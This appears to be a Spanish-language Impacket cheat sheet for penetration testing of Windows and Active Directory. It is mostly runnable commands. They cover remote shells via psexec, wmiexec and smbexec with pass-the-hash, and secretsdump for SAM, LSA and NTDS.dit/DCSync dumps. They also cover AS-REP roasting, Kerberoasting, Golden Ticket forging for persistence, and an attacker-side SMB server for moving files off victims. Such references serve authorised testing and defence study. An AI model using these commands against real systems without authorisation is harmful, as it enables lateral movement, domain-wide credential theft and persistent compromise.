# Impacket Suite Cheat Sheet
> **Guía de referencia rápida para las herramientas de la suite Impacket utilizadas en enumeración, explotación y post-explotación en entornos Windows y Active Directory.**

---

## 🔑 Ejecución Remota de Comandos (Lateral Movement)

Estas herramientas permiten obtener una shell en la máquina víctima utilizando credenciales válidas o hashes NTLM (Pass-The-Hash).

### 1. `impacket-psexec`
Crea un servicio remoto en Windows. Es ruidoso y escribe en el disco, pero proporciona una shell interactiva de nivel `SYSTEM`.
```bash
# Con contraseña en texto claro:
impacket-psexec dominio.local/usuario:password@<IP>
# Con Hash NTLM (Pass-The-Hash):
impacket-psexec dominio.local/usuario@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

### 2. `impacket-wmiexec`
Es más sigiloso que psexec porque se ejecuta a través de WMI sin instalar servicios en el objetivo. Devuelve una shell semi-interactiva.
```bash
impacket-wmiexec dominio.local/usuario:password@<IP>
impacket-wmiexec dominio.local/usuario@<IP> -hashes :NTLM_HASH
```

### 3. `impacket-smbexec`
Similar a psexec, pero en lugar de instalar un servicio permanente, ejecuta comandos directamente a través del procesador de comandos de Windows (`cmd.exe`).
```bash
impacket-smbexec dominio.local/usuario:password@<IP>
```

---

## 📂 Extracción de Credenciales (Credential Dumping)

### 1. `impacket-secretsdump`
Permite volcar las contraseñas locales (SAM y secretos LSA) de un equipo, o bien la base de datos completa de Active Directory (`NTDS.dit`).
* **Volcado local (procesando archivos SAM y SYSTEM guardados)**:
  ```bash
  impacket-secretsdump -sam sam.save -system system.save LOCAL
  ```
* **Volcado remoto de SAM/LSA (requiere privilegios de Admin)**:
  ```bash
  impacket-secretsdump dominio.local/usuario:password@<IP>
  ```
* **Volcado remoto de NTDS.dit (DCSync - requiere permisos de administrador de dominio)**:
  ```bash
  impacket-secretsdump dominio.local/usuario_admin:password@<IP_DC>
  # Usando Pass-The-Hash:
  impacket-secretsdump dominio.local/usuario_admin@<IP_DC> -hashes :NTLM_HASH
  ```

---

## 🛡️ Ataques de Autenticación Kerberos

### 1. `impacket-GetNPUsers` (AS-REP Roasting)
Busca cuentas de usuario que no requieran pre-autenticación Kerberos para solicitar sus tickets TGT.
```bash
impacket-GetNPUsers dominio.local/ -no-pass -usersfile usuarios.txt -format hashcat -outputfile asreproast.txt
```

### 2. `impacket-GetUserSPNs` (Kerberoasting)
Busca cuentas de servicio registradas con un SPN para solicitar tickets de servicio (TGS) crackeables offline.
```bash
impacket-GetUserSPNs dominio.local/usuario:password -request -outputfile kerberoast.txt
```

### 3. `impacket-getTGT` (Over-Pass-The-Hash / Pass-The-Key)
Solicita un ticket Kerberos TGT utilizando el hash NTLM o la clave AES de un usuario.
```bash
impacket-getTGT dominio.local/usuario -hashes :NTLM_HASH
# Exportar el ticket generado (.ccache) para usar en otras herramientas:
export KRB5CCNAME=usuario.ccache
```

### 4. `impacket-ticketer` (Golden & Silver Tickets)
Falsifica tickets de Kerberos para persistencia.
```bash
# Crear un Golden Ticket (requiere el hash del usuario krbtgt):
impacket-ticketer -nthash <HASH_KRBTGT> -domain-sid <SID_DOMINIO> -domain dominio.local AdministradorFalso
```

---

## 📡 Servidor de Archivos Temporal

### 1. `impacket-smbserver`
Levanta un servidor de archivos SMB en tu máquina atacante para transferir archivos rápidamente desde/hacia la víctima.
```bash
# Compartir el directorio actual en el puerto 445 (soporta SMBv2):
impacket-smbserver compartida $(pwd) -smb2support
# Versión con autenticación (requerido por Windows modernos en algunas políticas):
impacket-smbserver compartida $(pwd) -smb2support -user 'hacker' -password 'hacker123'
```
